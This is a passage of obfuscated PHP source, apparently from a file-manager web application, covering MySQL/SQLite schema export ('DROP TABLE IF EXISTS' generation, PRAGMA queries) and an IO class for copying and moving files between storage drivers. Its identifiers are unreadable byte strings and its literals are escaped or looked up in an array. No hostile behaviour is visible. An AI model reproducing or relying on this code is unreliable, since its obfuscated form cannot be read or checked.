$¬Àì¬Óî->execute("\144\162\x6f\x70\40\x74\141\x62\x6c\x65\x20\x69\146\40\x65\170\151\x73\164\x73\x20\x60{$°½şšÍ}\x60"); } } private function sqlEncode($Ä¿ìÑ») { $æÎÊ™… =& $_SERVER[„Ç©ñÎ©]; $ÄòÇô‰™ = array(); foreach ($Ä¿ìÑ» as $™´êßù ) { if (is_array($™´êßù )) { $™´êßù  = json_encode_force($™´êßù ); } $™´êßù  = addslashes($™´êßù ); $™´êßù  = str_replace(array($æÎÊ™…[1077], $æÎÊ™…[66]), array($æÎÊ™…[1078], $æÎÊ™…[1079]), $™´êßù ); $ÄòÇô‰™[] = str_replace($æÎÊ™…[58], $æÎÊ™…[1080], $™´êßù ); } return $æÎÊ™…[58] . implode($æÎÊ™…[1081], $ÄòÇô‰™) . $æÎÊ™…[58]; } private function sqlDecode($ù‡ÁòôÇ, $ÇÉ¦×Âë, $ê‰ñÙÚ¥ = '') { $ Ä¥Ç¾ =& $_SERVER[„Ç©ñÎ©]; $ù‡ÁòôÇ = str_replace(array($ Ä¥Ç¾[1078], $ Ä¥Ç¾[1079]), array($ Ä¥Ç¾[1077], $ Ä¥Ç¾[66]), $ù‡ÁòôÇ); if ($ÇÉ¦×Âë == $ Ä¥Ç¾[13]) { return $ê‰ñÙÚ¥ != $ Ä¥Ç¾[1082] ? stripslashes($ù‡ÁòôÇ) : $ù‡ÁòôÇ; } if ($ê‰ñÙÚ¥ == $ Ä¥Ç¾[1082]) { $ù‡ÁòôÇ = str_replace($ Ä¥Ç¾[1083], $ Ä¥Ç¾[128], stripslashes($ù‡ÁòôÇ)); } return $ù‡ÁòôÇ; } public function getSqlFile($şøÎ’äº = '') { $¤¡‰êÏ” =& $_SERVER[„Ç©ñÎ©]; $ÚÓ ÷¬ = $this->dbType(!0); $Â˜—›† = CONTROLLER_DIR . "\151\156\x73\164\141\154\154\x2f\144\x61\164\x61\x2f{$ÚÓ ÷¬}\x2e\x73\x71\x6c"; $Çúìµ×¥ = file_get_contents($Â˜—›†); $Ğ–Åäà = $¤¡‰êÏ”[1084] . ($ÚÓ ÷¬ == $¤¡‰êÏ”[807] ? $¤¡‰êÏ”[1085] : $¤¡‰êÏ”[1086]) . $¤¡‰êÏ”[1087]; preg_match_all($Ğ–Åäà, $Çúìµ×¥, $ÇÉºöõè); $•â´Ä€Í = $ÇÉºöõè[1]; $½ùÁĞáş = $this->model()->db(); $©©ìß¨Ä = $½ùÁĞáş->getTables(); $îÇÏî™Œ = TEMP_FILES . $¤¡‰êÏ”[1088] . date($¤¡‰êÏ”[754]) . $¤¡‰êÏ”[8]; del_dir($îÇÏî™Œ); mk_dir($îÇÏî™Œ); $•ÏïÈÊ = $îÇÏî™Œ . $¤¡‰êÏ”[1089]; $Ì¹¹´£¿ = $îÇÏî™Œ . $¤¡‰êÏ”[1090]; $ŸÎœòÏ‰ = $ÚÓ ÷¬ == $¤¡‰êÏ”[13] ? $¤¡‰êÏ”[807] : $¤¡‰êÏ”[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\x73\164\141\154\x6c\x2f\x64\x61\x74\x61\57{$ŸÎœòÏ‰}\56\163\x71\154", $îÇÏî™Œ); @touch($îÇÏî™Œ . $ÚÓ ÷¬ . $¤¡‰êÏ”[791]); $À ¿Â¶Â = fopen($•ÏïÈÊ, $¤¡‰êÏ”[1065]); $Ó×îÄ‹ = fopen($Ì¹¹´£¿, $¤¡‰êÏ”[1065]); if ($ÚÓ ÷¬ == $¤¡‰êÏ”[13]) { $©©ìß¨Ä = array_diff($©©ìß¨Ä, array($¤¡‰êÏ”[787], $¤¡‰êÏ”[788])); $ŠÅõâÙ = array($¤¡‰êÏ”[1091], $¤¡‰êÏ”[1092], $¤¡‰êÏ”[1093]); fwrite($Ó×îÄ‹, implode(PHP_EOL, $ŠÅõâÙ) . PHP_EOL . PHP_EOL); foreach ($©©ìß¨Ä as $ËÍ—õÆÀ) { $²ıÉ”ŞÍ = $this->sqlFromSqlite($ËÍ—õÆÀ); if (!$²ıÉ”ŞÍ[$¤¡‰êÏ”[13]]) { continue; } fwrite($Ó×îÄ‹, $²ıÉ”ŞÍ[$¤¡‰êÏ”[13]] . PHP_EOL . PHP_EOL); if (!in_array($ËÍ—õÆÀ, $•â´Ä€Í)) { fwrite($À ¿Â¶Â, $²ıÉ”ŞÍ[$¤¡‰êÏ”[807]] . PHP_EOL . PHP_EOL); } } } else { foreach ($©©ìß¨Ä as $ËÍ—õÆÀ) { $²ıÉ”ŞÍ = $this->sqlFromMysql($ËÍ—õÆÀ); if (!$²ıÉ”ŞÍ[$¤¡‰êÏ”[807]]) { continue; } fwrite($À ¿Â¶Â, $²ıÉ”ŞÍ[$¤¡‰êÏ”[807]] . PHP_EOL . PHP_EOL); if (!in_array($ËÍ—õÆÀ, $•â´Ä€Í)) { fwrite($Ó×îÄ‹, $²ıÉ”ŞÍ[$¤¡‰êÏ”[13]] . PHP_EOL . PHP_EOL); } } } fclose($À ¿Â¶Â); fclose($Ó×îÄ‹); $Çúìµ×¥ = array($¤¡‰êÏ”[807] => $•ÏïÈÊ, $¤¡‰êÏ”[13] => $Ì¹¹´£¿); return $şøÎ’äº ? $Çúìµ×¥[$şøÎ’äº] : $Çúìµ×¥; } public function dbType($—‚íÂ—… = false) { $…ö®ùİ =& $_SERVER[„Ç©ñÎ©]; $†‚èì—´ = $—‚íÂ—… ? $GLOBALS[$…ö®ùİ[6]][$…ö®ùİ[21]] : $this->database; $†‚èì—´ = array_change_key_case($†‚èì—´); $İÏÓşš  = $†‚èì—´[$…ö®ùİ[966]]; if ($İÏÓşš  == $…ö®ùİ[963]) { $´¦øÄüî = explode($…ö®ùİ[4], $†‚èì—´[$…ö®ùİ[972]]); $İÏÓşš  = $´¦øÄüî[0]; } $¼ö…ü„ = array($…ö®ùİ[1094] => $…ö®ùİ[13], $…ö®ùİ[911] => $…ö®ùİ[807]); if (isset($¼ö…ü„[$İÏÓşš ])) { $İÏÓşš  = $¼ö…ü„[$İÏÓşš ]; } return $İÏÓşš ; } public function sqlFromMysql($äÈù¦¹÷, $Ÿ·¦ˆÅ = '') { $ûí„¾Ï =& $_SERVER[„Ç©ñÎ©]; $ü’¦èÅë = $this->model()->db(); $— ÄË¦ = $ü’¦èÅë->query($ûí„¾Ï[1095] . $äÈù¦¹÷ . $ûí„¾Ï[394]); if (!$— ÄË¦ || !$— ÄË¦[0]) { return !1; } $àòÓô² = _get($— ÄË¦[0], $ûí„¾Ï[1096], $ûí„¾Ï[12]); if (!$àòÓô²) { return !1; } $Ñ¥ÔÀê¿ = "\104\x52\x4f\120\x20\x54\101\x42\114\x45\40\111\x46\x20\105\x58\x49\x53\x54\x53\x20\x60{$äÈù¦¹÷}\x60\x3b" . PHP_EOL . $àòÓô² . $ûí„¾Ï[81]; if ($Ÿ·¦ˆÅ && $Ÿ·¦ˆÅ == $ûí„¾Ï[807]) { return $Ñ¥ÔÀê¿; } $ùŞşÌÛ½ = array_change_key_case($GLOBALS[$ûí„¾Ï[6]][$ûí„¾Ï[21]]); $ÕÒ“Ö‘ò = $ùŞşÌÛ½[$ûí„¾Ï[971]]; $ÎÅ¼Ë½ = $ûí„¾Ï[1097] . $ÕÒ“Ö‘ò . $ûí„¾Ï[1098] . $äÈù¦¹÷ . $ûí„¾Ï[58]; $Ú…ö…å = $ûí„¾Ï[1099] . $äÈù¦¹÷ . $ûí„¾Ï[899]; $“õôŠà÷ = $ü’¦èÅë->query($ÎÅ¼Ë½); if (empty($“õôŠà÷)) { $Ø•ÜÁ°“ = array($ûí„¾Ï[807] => $ûí„¾Ï[12], $ûí„¾Ï[13] => $ûí„¾Ï[12]); return $Ÿ·¦ˆÅ ? $Ø•ÜÁ°“[$Ÿ·¦ˆÅ] : $Ø•ÜÁ°“; } $´Ğü°í = $ü’¦èÅë->query($Ú…ö…å); $ï“Šì”Ü = $ûí„¾Ï[12]; $ÃşüÉ¾¹ = array(); foreach ($´Ğü°í as $šîŞ”°) { if (!$ï“Šì”Ü && $šîŞ”°[$ûí„¾Ï[1100]] == $ûí„¾Ï[1101]) { $ï“Šì”Ü = $šîŞ”°[$ûí„¾Ï[1102]]; } if (isset($ÃşüÉ¾¹[$šîŞ”°[$ûí„¾Ï[1100]]])) { $ÃşüÉ¾¹[$šîŞ”°[$ûí„¾Ï[1100]]][$ûí„¾Ï[1103]][] = $šîŞ”°[$ûí„¾Ï[1102]]; continue; } $ÃşüÉ¾¹[$šîŞ”°[$ûí„¾Ï[1100]]] = array($ûí„¾Ï[1104] => $šîŞ”°[$ûí„¾Ï[1100]], $ûí„¾Ï[1103] => array($šîŞ”°[$ûí„¾Ï[1102]]), $ûí„¾Ï[1105] => $šîŞ”°[$ûí„¾Ï[1106]] == $ûí„¾Ï[98] ? 0 : 1); } $áù¸¬ = array(); foreach ($ÃşüÉ¾¹ as $šîŞ”°) { $ŠºÌİ®– = $šîŞ”°[$ûí„¾Ï[1104]] == $ûí„¾Ï[1101]; $°§¿¢í¥ = array($ûí„¾Ï[1107], $šîŞ”°[$ûí„¾Ï[1105]] == $ûí„¾Ï[98] && !$ŠºÌİ®– ? $ûí„¾Ï[1108] : $ûí„¾Ï[12], $ûí„¾Ï[1109], $ûí„¾Ï[1110] . $äÈù¦¹÷ . $ûí„¾Ï[11] . ($ŠºÌİ®– ? $ûí„¾Ï[1111] : $šîŞ”°[$ûí„¾Ï[1104]]) . $ûí„¾Ï[128], $ûí„¾Ï[1112], $ûí„¾Ï[128] . $äÈù¦¹÷ . $ûí„¾Ï[128], $ûí„¾Ï[1113] . implode($ûí„¾Ï[1114], $šîŞ”°[$ûí„¾Ï[1103]]) . $ûí„¾Ï[1115]); $áù¸¬[] = implode($ûí„¾Ï[53], $°§¿¢í¥) . $ûí„¾Ï[81]; } $şÛ¸«’ = array(); $¥†•¾©ô = array($ûí„¾Ï[1116] => $ûí„¾Ï[1117], $ûí„¾Ï[1117] => $ûí„¾Ï[1117], $ûí„¾Ï[297] => $ûí„¾Ï[324], $ûí„¾Ï[296] => $ûí„¾Ï[324]); foreach ($“õôŠà÷ as $šîŞ”°) { $°§¿¢í¥ = array($ûí„¾Ï[128] . $šîŞ”°[$ûí„¾Ï[1118]] . $ûí„¾Ï[128], isset($¥†•¾©ô[$šîŞ”°[$ûí„¾Ï[1119]]]) ? $¥†•¾©ô[$šîŞ”°[$ûí„¾Ï[1119]]] : $šîŞ”°[$ûí„¾Ï[1120]], $šîŞ”°[$ûí„¾Ï[1121]] == $ûí„¾Ï[897] ? $ûí„¾Ï[1122] : $ûí„¾Ï[1123], $šîŞ”°[$ûí„¾Ï[1118]] == $ï“Šì”Ü ? $ûí„¾Ï[1124] : $ûí„¾Ï[12], $šîŞ”°[$ûí„¾Ï[948]] ? strtoupper(str_replace($ûí„¾Ï[11], $ûí„¾Ï[12], $šîŞ”°[$ûí„¾Ï[948]])) : $ûí„¾Ï[12]); $şÛ¸«’[] = trim(implode($ûí„¾Ï[53], $°§¿¢í¥)); } $Ü÷’³ƒ¬ = array($ûí„¾Ï[1125] . $äÈù¦¹÷ . $ûí„¾Ï[1126], $ûí„¾Ï[1127] . $äÈù¦¹÷ . $ûí„¾Ï[1128], implode($ûí„¾Ï[50] . PHP_EOL, $şÛ¸«’), $ûí„¾Ï[945]); $»ğ‘¥ù÷ = implode(PHP_EOL, array_merge($Ü÷’³ƒ¬, $áù¸¬)); if ($Ÿ·¦ˆÅ && $Ÿ·¦ˆÅ == $ûí„¾Ï[13]) { return $»ğ‘¥ù÷; } $Ø•ÜÁ°“ = array($ûí„¾Ï[807] => $Ñ¥ÔÀê¿, $ûí„¾Ï[13] => $»ğ‘¥ù÷); return $Ÿ·¦ˆÅ ? $Ø•ÜÁ°“[$Ÿ·¦ˆÅ] : $Ø•ÜÁ°“; } public function sqlFromSqlite($¤èÄÉ»å, $Ú›¢ÌÎ¢ = '') { $Œí¯äˆ =& $_SERVER[„Ç©ñÎ©]; $¦²¾û æ = $this->model()->db(); $Â†ëÑü· = "\x50\x52\101\x47\x4d\x41\x20\x54\x41\x42\114\x45\x5f\x49\x4e\106\x4f\40\50\x27{$¤èÄÉ»å}\47\x29"; $Ğ­©·Ä = "\x53\105\114\x45\x43\124\40\x2a\x20\x46\x52\x4f\x4d\40\x73\161\154\151\164\145\x5f\x6d\141\x73\x74\x65\x72\40\x57\110\x45\x52\x45\40\x74\142\154\137\156\141\155\x65\40\x3d\40\x27{$¤èÄÉ»å}\x27"; $‘¾âÍÜæ = $¦²¾û æ->query($Â†ëÑü·); if (empty($‘¾âÍÜæ)) { $½©¢«ª = array($Œí¯äˆ[807] => $Œí¯äˆ[12], $Œí¯äˆ[13] => $Œí¯äˆ[12]); return $Ú›¢ÌÎ¢ ? $½©¢«ª[$Ú›¢ÌÎ¢] : $½©¢«ª; } $í¢¯ä¿© = $¦²¾û æ->query($Ğ­©·Ä); $Ÿ½¯åƒ = $ÏÊ¬ü‹ = array(); foreach ($í¢¯ä¿© as $‘¬™õ¼¯) { if ($‘¬™õ¼¯[$Œí¯äˆ[33]] == $Œí¯äˆ[288]) { $Ÿ½¯åƒ[] = $‘¬™õ¼¯[$Œí¯äˆ[1129]]; } else { $ÏÊ¬ü‹[$‘¬™õ¼¯[$Œí¯äˆ[32]]] = $‘¬™õ¼¯[$Œí¯äˆ[1129]]; } } $Ì±¦›½ã = array_merge(array($Œí¯äˆ[1125] . $¤èÄÉ»å . $Œí¯äˆ[128]), $Ÿ½¯åƒ, array_values($ÏÊ¬ü‹)); $Ì±¦›½ã = implode($Œí¯äˆ[81] . PHP_EOL, $Ì±¦›½ã) . $Œí¯äˆ[81]; if ($Ú›¢ÌÎ¢ && $Ú›¢ÌÎ¢ == $Œí¯äˆ[13]) { return $Ì±¦›½ã; } $Û„ÖçÑÏ = array(); $ ÏŞÁ×õ = array($Œí¯äˆ[1117] => $Œí¯äˆ[1130], $Œí¯äˆ[324] => $Œí¯äˆ[1131]); $üæ™¾»€ = $Œí¯äˆ[12]; foreach ($‘¾âÍÜæ as $‘¬™õ¼¯) { if ($‘¬™õ¼¯[$Œí¯äˆ[57]] == $Œí¯äˆ[98]) { $üæ™¾»€ = $‘¬™õ¼¯[$Œí¯äˆ[32]]; } $â‹¸±ÅÜ = array($Œí¯äˆ[394] . $‘¬™õ¼¯[$Œí¯äˆ[32]] . $Œí¯äˆ[394], isset($ ÏŞÁ×õ[$‘¬™õ¼¯[$Œí¯äˆ[33]]]) ? $ ÏŞÁ×õ[$‘¬™õ¼¯[$Œí¯äˆ[33]]] : $‘¬™õ¼¯[$Œí¯äˆ[33]], $‘¬™õ¼¯[$Œí¯äˆ[35]] == $Œí¯äˆ[98] ? $Œí¯äˆ[1122] : $Œí¯äˆ[1132] . $‘¬™õ¼¯[$Œí¯äˆ[56]], $‘¬™õ¼¯[$Œí¯äˆ[57]] == $Œí¯äˆ[98] ? $Œí¯äˆ[1133] : $Œí¯äˆ[12]); $Û„ÖçÑÏ[] = trim(implode($Œí¯äˆ[53], $â‹¸±ÅÜ)); } foreach ($ÏÊ¬ü‹ as $óÏ™€Ïô => $¨ßêş¼æ) { $à¼ÍİŸ‡ = str_replace($Œí¯äˆ[1134] . $¤èÄÉ»å . $Œí¯äˆ[11], $Œí¯äˆ[12], $óÏ™€Ïô); $ƒ•µãÄª = str_replace(array($Œí¯äˆ[128], $Œí¯äˆ[956]), $Œí¯äˆ[394], substr($¨ßêş¼æ, stripos($¨ßêş¼æ, $Œí¯äˆ[269]))); if ($à¼ÍİŸ‡ == $Œí¯äˆ[1111]) { $¢†É £ª = $Œí¯äˆ[1135] . $üæ™¾»€ . $Œí¯äˆ[1136]; } else { $¢†É £ª = (stripos($à¼ÍİŸ‡, $Œí¯äˆ[11]) ? $Œí¯äˆ[1137] : $Œí¯äˆ[12]) . ($Œí¯äˆ[1138] . $à¼ÍİŸ‡ . $Œí¯äˆ[1139] . $ƒ•µãÄª); } $Û„ÖçÑÏ[] = $¢†É £ª; } $ı¥«ËÂÈ = array($Œí¯äˆ[1140] . $¤èÄÉ»å . $Œí¯äˆ[1141], $Œí¯äˆ[1142] . $¤èÄÉ»å . $Œí¯äˆ[1143], implode($Œí¯äˆ[50] . PHP_EOL, $Û„ÖçÑÏ), $Œí¯äˆ[1144]); $Ù˜œ§şô = implode(PHP_EOL, $ı¥«ËÂÈ); if ($Ú›¢ÌÎ¢ && $Ú›¢ÌÎ¢ == $Œí¯äˆ[807]) { return $Ù˜œ§şô; } $½©¢«ª = array($Œí¯äˆ[807] => $Ù˜œ§şô, $Œí¯äˆ[13] => $Ì±¦›½ã); return $Ú›¢ÌÎ¢ ? $½©¢«ª[$Ú›¢ÌÎ¢] : $½©¢«ª; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ñ² ìË, $©è¿ã») { $ø·éÒ‘„ =& $_SERVER[„Ç©ñÎ©]; $Ğ…ø°¤ê = $©è¿ã»; $GLOBALS[$ø·éÒ‘„[1145]] = $ø·éÒ‘„[1146] . $Ñ² ìË; Hook::trigger($ø·éÒ‘„[1146] . $Ñ² ìË . $ø·éÒ‘„[1147], $Ğ…ø°¤ê); $ÂùĞ³Œ = self::driverMake($©è¿ã»[0]); if (!$ÂùĞ³Œ) { return !1; } if (method_exists($ÂùĞ³Œ, $Ñ² ìË)) { $£ş›ÏùŸ = @call_user_func_array(array($ÂùĞ³Œ, $Ñ² ìË), $©è¿ã»); } else { if (method_exists($ÂùĞ³Œ, $ø·éÒ‘„[1148])) { $£ş›ÏùŸ = @call_user_func_array(array($ÂùĞ³Œ, $Ñ² ìË), $©è¿ã»); } else { if (method_exists(self, $Ñ² ìË)) { $£ş›ÏùŸ = @call_user_func_array(array(self, $Ñ² ìË), $©è¿ã»); } else { $£ş›ÏùŸ = call_user_func_array(array(parent, $Ñ² ìË), $©è¿ã»); } } } Hook::trigger($ø·éÒ‘„[1146] . $Ñ² ìË . $ø·éÒ‘„[1149], $Ğ…ø°¤ê, $£ş›ÏùŸ); return $£ş›ÏùŸ; } public static function init($ÊŒô£ëÉ) { return self::driverMake($ÊŒô£ëÉ); } public static function copy($àÉíôÕ¿, $Ü­»²ÚÉ, $€É³½‚¶ = false, $õŸˆ»Ô• = false) { return self::copyMoveStart($àÉíôÕ¿, $Ü­»²ÚÉ, $€É³½‚¶, $_SERVER[„Ç©ñÎ©][564], $õŸˆ»Ô•); } public static function move($¡†§Íºã, $²ŸÖ‰”¸, $ƒø‰ıÒ = false, $ç˜õ½µ— = false) { return self::copyMoveStart($¡†§Íºã, $²ŸÖ‰”¸, $ƒø‰ıÒ, $_SERVER[„Ç©ñÎ©][566], $ç˜õ½µ—); } private static function copyMoveStart($šçÃ³Œ, $ú²Î­×­, $õ‡Ößë, $£ĞáÅ¹š, $šÄüÓ’œ) { $šê÷”éë =& $_SERVER[„Ç©ñÎ©]; $ÉœÀ¦¿¯ = array($šçÃ³Œ, $ú²Î­×­, $õ‡Ößë, $šÄüÓ’œ); Hook::trigger($šê÷”éë[1146] . $£ĞáÅ¹š . $šê÷”éë[1147], $ÉœÀ¦¿¯); $°‘ÍÕÕ = self::copyMove($šçÃ³Œ, $ú²Î­×­, $õ‡Ößë, $£ĞáÅ¹š, $šÄüÓ’œ); Hook::trigger($šê÷”éë[1146] . $£ĞáÅ¹š . $šê÷”éë[1149], $ÉœÀ¦¿¯, $°‘ÍÕÕ); return $°‘ÍÕÕ; } public static function saveFile($˜ã‹¿µµ, $óµº¾êº, $ÊÛºŸ˜Â = true) { $³ş±ĞÀ =& $_SERVER[„Ç©ñÎ©]; $ÙŞÑŠœ = self::info($óµº¾êº); $È¯¡ì¤¯ = self::driverMake($˜ã‹¿µµ); $ÉĞüŞ†„ = self::driverMake($óµº¾êº); $œú×ğ‡± = !1; if ($ÉĞüŞ†„->pathParse[$³ş±ĞÀ[1150]]) { $œú×ğ‡± = $ÉĞüŞ†„; $ß™ğÁö× = $ÉĞüŞ†„->pathParse[$³ş±ĞÀ[1150]]; $ÉĞüŞ†„ = self::driverMake($ß™ğÁö×); } if ($È¯¡ì¤¯->pathParse[$³ş±ĞÀ[1150]]) { $‡Àé†Ÿ = $È¯¡ì¤¯->pathParse[$³ş±ĞÀ[1150]]; $È¯¡ì¤¯ = self::driverMake($‡Àé†Ÿ); } $ËåËãŞö = $ÉĞüŞ†„->pathFather($óµº¾êº); $×¦•şÖ = !0; if (!$ÊÛºŸ˜Â && self::driverIsSame($È¯¡ì¤¯, $ÉĞüŞ†„)) { $×¦•şÖ = !1; } $‡ë¸éÜ´ = self::copyFile($È¯¡ì¤¯, $˜ã‹¿µµ, $ÉĞüŞ†„, $ËåËãŞö, $ÙŞÑŠœ[$³ş±ĞÀ[32]], $×¦•şÖ); if ($œú×ğ‡±) { $‡ë¸éÜ´ = $œú×ğ‡±->getPathOuter($‡ë¸éÜ´); } return $‡ë¸éÜ´; } private static function copyMove($ÔëËöâô, $ş†™Ó¿ì, $Ùì«ŒÔÁ, $¸ì×“Ø™, $ù‘İŒ÷Ã = false) { $ö­éİ–÷ =& $_SERVER[„Ç©ñÎ©]; if (!$ÔëËöâô || $ÔëËöâô == $ö­éİ–÷[8] || !$ş†™Ó¿ì) { return !1; } ignore_timeout(); $Œ…¶œ™¡ = self::driverMake($ÔëËöâô); $ê£é”Ä§ = self::driverMake($ş†™Ó¿ì); $³ì•û = $¸ì×“Ø™ == $ö­éİ–÷[566]; $Öí­¢ã¼ = !1; if ($ê£é”Ä§->pathParse[$ö­éİ–÷[1150]]) { $Öí­¢ã¼ = $ê£é”Ä§; $ş†™Ó¿ì = $ê£é”Ä§->pathParse[$ö­éİ–÷[1150]]; $ê£é”Ä§ = self::driverMake($ş†™Ó¿ì); } if ($Œ…¶œ™¡->pathParse[$ö­éİ–÷[1150]]) { $ÔëËöâô = $Œ…¶œ™¡->pathParse[$ö­éİ–÷[1150]]; $Œ…¶œ™¡ = self::driverMake($ÔëËöâô); } self::check($Œ…¶œ™¡, $ÔëËöâô, $ê£é”Ä§, $ş†™Ó¿ì); Hook::trigger($ö­éİ–÷[1151], $Œ…¶œ™¡, $ÔëËöâô, $ê£é”Ä§, $ş†™Ó¿ì); $½¾à¹…— = self::driverIsSame($Œ…¶œ™¡, $ê£é”Ä§); if ($½¾à¹…—) { if ($¸ì×“Ø™ == $ö­éİ–÷[566] && !method_exists($ê£é”Ä§, $ö­éİ–÷[1152]) && trim($ş†™Ó¿ì, $ö­éİ–÷[8]) == trim($ê£é”Ä§->pathFather($ÔëËöâô), $ö­éİ–÷[8])) { if ($Œ…¶œ™¡->pathThis($ÔëËöâô) != $ù‘İŒ÷Ã && !$Œ…¶œ™¡->isTypeObject()) { return $Œ…¶œ™¡->rename($ÔëËöâô, $ù‘İŒ÷Ã); } return $ê£é”Ä§->getPathOuter($ÔëËöâô); } if (method_exists($ê£é”Ä§, $¸ì×“Ø™)) { return $ê£é”Ä§->{$¸ì×“Ø™}($ÔëËöâô, $ş†™Ó¿ì, $Ùì«ŒÔÁ, $ù‘İŒ÷Ã); } } if ($½¾à¹…— && $¸ì×“Ø™ == $ö­éİ–÷[566] && $ê£é”Ä§->getType() == $ö­éİ–÷[116]) { $æ¾¸òÆ© = $ê£é”Ä§->movePath($ÔëËöâô, $ş†™Ó¿ì, $ù‘İŒ÷Ã); if ($æ¾¸òÆ©) { return $æ¾¸òÆ©; } } $İ³ÍÜÍğ = $Œ…¶œ™¡->isFile($ÔëËöâô); if (!$İ³ÍÜÍğ && $ê£é”Ä§->getType() == $ö­éİ–÷[761] && $Œ…¶œ™¡->getType() == $ö­éİ–÷[116]) { $æ¾¸òÆ© = $ê£é”Ä§->copyFolderFromIO($Œ…¶œ™¡, $ÔëËöâô, $ş†™Ó¿ì, $Ùì«ŒÔÁ, $³ì•û, $ù‘İŒ÷Ã); } else { $æ¾¸òÆ© = self::copyPath($Œ…¶œ™¡, $ÔëËöâô, $ê£é”Ä§, $ş†™Ó¿ì, $Ùì«ŒÔÁ, $³ì•û, $İ³ÍÜÍğ, $ù‘İŒ÷Ã); } if ($æ¾¸òÆ© && $³ì•û) { $Œ…¶œ™¡->remove($ÔëËöâô); } if ($Öí­¢ã¼) { $æ¾¸òÆ© = $Öí­¢ã¼->getPathOuter($æ¾¸òÆ©); } return $æ¾¸òÆ©; } private static function check($Ëº¥‰â¯, $à˜‹àôß, $¨ãºì´Œ, &$ËÏÄí¢) { $Ìı·¤Ò =& $_SERVER[„Ç©ñÎ©]; if (self::driverIsSame($Ëº¥‰â¯, $¨ãºì´Œ) && $Ëº¥‰â¯->isFolder($à˜‹àôß) && $Ëº¥‰â¯->isParentOf($à˜‹àôß, $ËÏÄí¢)) { show_json(LNG($Ìı·¤Ò[1153]), !1); } if (!$Ëº¥‰â¯->exist($à˜‹àôß)) { show_json(LNG($Ìı·¤Ò[115]), !1); } } private static function copyPath($¨¾Õú‹¯, $ß‚Ô, $íè†Ï…Ù, $Ù”Íƒ“ñ, $Ã‡“ÈçÒ, $˜Ÿ¬‰ã, $Ú¬õ½œ, $šÄ÷†« = false, $×¨ùªæ = true) { $Ó¨½·×ö =& $_SERVER[„Ç©ñÎ©]; $î‚‚˜Ì = empty($šÄ÷†«) && $šÄ÷†« !== $Ó¨½·×ö[207] ? $¨¾Õú‹¯->pathThis($ß‚Ô) : $šÄ÷†«; if ($Ã‡“ÈçÒ) { $Æ†ê‚›¸ = $íè†Ï…Ù->fileNameExist($Ù”Íƒ“ñ, $î‚‚˜Ì); $Å îîÙŒ = $î‚‚˜Ì; $î‚‚˜Ì = $íè†Ï…Ù->fileNameAuto($Ù”Íƒ“ñ, $î‚‚˜Ì, $Ã‡“ÈçÒ, !$Ú¬õ½œ); if (!$Æ†ê‚›¸ || $Å îîÙŒ != $î‚‚˜Ì) { $Ã‡“ÈçÒ = !1; } if ($×¨ùªæ && !$Ã‡“ÈçÒ) { $íè†Ï…Ù->_data[$Ó¨½·×ö[1154]] = !0; } } if ($Ú¬õ½œ) { return self::copyFile($¨¾Õú‹¯, $ß‚Ô, $íè†Ï…Ù, $Ù”Íƒ“ñ, $î‚‚˜Ì, $˜Ÿ¬‰ã); } if ($Ã‡“ÈçÒ == REPEAT_RENAME_FOLDER) { $Ã‡“ÈçÒ = !1; } $Ü¿—°€Ê = rtrim($Ù”Íƒ“ñ, $Ó¨½·×ö[8]) . $Ó¨½·×ö[8] . $î‚‚˜Ì; $—É±¦× = $íè†Ï…Ù->mkdir($íè†Ï…Ù->getPath($Ü¿—°€Ê), $Ã‡“ÈçÒ); $Ù”Íƒ“ñ = $íè†Ï…Ù->getPathInner($—É±¦×); $Åê «Ã× = $¨¾Õú‹¯->listPath($ß‚Ô, !0); $Åê «Ã× = is_array($Åê «Ã×) ? $Åê «Ã× : array($Ó¨½·×ö[93] => array(), $Ó¨½·×ö[92] => array()); $ŒÖıÊÂÚ = array_merge($Åê «Ã×[$Ó¨½·×ö[93]], $Åê «Ã×[$Ó¨½·×ö[92]]); foreach ($ŒÖıÊÂÚ as $À˜÷Û±) { $©µµˆØ‰ = $À˜÷Û±[$Ó¨½·×ö[33]] == $Ó¨½·×ö[209]; $ß‚Ô = $¨¾Õú‹¯->getPathInner($À˜÷Û±[$Ó¨½·×ö[94]]); $ú§®üç = self::copyPath($¨¾Õú‹¯, $ß‚Ô, $íè†Ï…Ù, $Ù”Íƒ“ñ, $Ã‡“ÈçÒ, $˜Ÿ¬‰ã, $©µµˆØ‰, !1, !1); if (!$ú§®üç) { IO::errorTips($Ó¨½·×ö[1155] . $ß‚Ô . $Ó¨½·×ö[80] . $Ù”Íƒ“ñ); } } self::copyMoveKeepInfo($¨¾Õú‹¯, $ß‚Ô, $—É±¦×); return $—É±¦×; } private static function copyFile($îèèÊ†œ, $€ŸêÌöó, $±Ì˜»ò©, $ƒ†ÖËàí, $à£ú†ÁÆ, $ÁÛ¯ÑªÀ) { $’Î¥¹ë =& $_SERVER[„Ç©ñÎ©]; $ƒ†ÖËàí = $±Ì˜»ò©->getPath(rtrim($ƒ†ÖËàí, $’Î¥¹ë[8]) . $’Î¥¹ë[8] . $à£ú†ÁÆ); $šÏªÚÅ­ = $’Î¥¹ë[1156] . time() . rand_string(5); Hook::trigger($’Î¥¹ë[1157], $îèèÊ†œ, $€ŸêÌöó, $±Ì˜»ò©, $ƒ†ÖËàí, $à£ú†ÁÆ, $šÏªÚÅ­); if (self::driverIsSame($îèèÊ†œ, $±Ì˜»ò©)) { if ($ÁÛ¯ÑªÀ) { $¯ÏûÏÕÀ = $±Ì˜»ò©->moveFile($€ŸêÌöó, $ƒ†ÖËàí); } else { $¯ÏûÏÕÀ = $±Ì˜»ò©->copyFile($€ŸêÌöó, $ƒ†ÖËàí); } Hook::trigger($’Î¥¹ë[1158], $îèèÊ†œ, $€ŸêÌöó, $±Ì˜»ò©, $ƒ†ÖËàí, $à£ú†ÁÆ, $¯ÏûÏÕÀ); self::copyMoveKeepInfo($îèèÊ†œ, $€ŸêÌöó, $¯ÏûÏÕÀ); return $¯ÏûÏÕÀ; } $ö¥İÌÑ = TEMP_FILES; if ($GLOBALS[$’Î¥¹ë[6]][$’Î¥¹ë[99]][$’Î¥¹ë[799]]) { $ö¥İÌÑ = $GLOBALS[$’Î¥¹ë[6]][$’Î¥¹ë[99]][$’Î¥¹ë[799]]; } $º¿ğññÊ = $ö¥İÌÑ; mk_dir($º¿ğññÊ); $ö²æ£Ò = $º¿ğññÊ . $šÏªÚÅ­; $©¶Ğ‹Í™ = $ö²æ£Ò; $ö²æ£Ò = $îèèÊ†œ->download($€ŸêÌöó, $ö²æ£Ò); $ö²æ£Ò = 